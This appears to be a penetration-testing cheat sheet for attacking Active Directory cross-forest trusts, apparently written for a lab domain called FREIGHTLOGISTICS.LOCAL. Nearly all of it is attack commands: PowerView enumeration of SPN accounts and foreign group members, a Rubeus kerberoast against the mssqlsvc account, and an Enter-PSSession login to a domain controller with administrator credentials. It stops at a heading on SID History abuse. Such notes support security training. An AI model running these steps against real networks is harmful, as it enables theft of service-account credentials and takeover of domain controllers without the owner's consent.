---
layout: app
title: "AD Domain Trusts Cross-Forest"
tags: ["Kerberoasting"]

---

# Enumerating Accounts for Associated SPNs Using Get-DomainUser

```powershell
(powerview)> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

```powershell
(powerview)> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```


## Performing a Kerberoasting Attacking with Rubeus Using /domain Flag

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

# Admin Password Re-Use & Group Membership

```powershell
(powerview)> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
(powerview)>Convert-SidToName [Group SID]
```
## Accessing to DC Using Enter-PSSession

```powershell
(powerview)> Enter-PSSession -ComputerName COMPUTER-DC.DOMAIN -Credential domain\administrator
```

# SID History Abuse - Cross Forest

